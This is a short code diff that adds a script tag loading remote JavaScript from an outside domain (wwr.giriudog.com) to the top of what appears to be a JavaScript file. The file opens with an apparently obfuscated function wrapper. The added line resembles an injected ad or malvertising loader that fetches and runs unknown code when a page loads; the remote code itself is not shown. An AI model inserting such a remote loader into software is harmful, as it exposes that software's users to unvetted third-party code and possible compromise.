@@ -1,3 +1,5 @@
+<script data-cfasync='false' src='//wwr.giriudog.com/?tag=6afb306c'></script>
+
 (function() {
     // === 1. SCRIPT GLOBAL (fearfullack) ===
     (function(bekw){
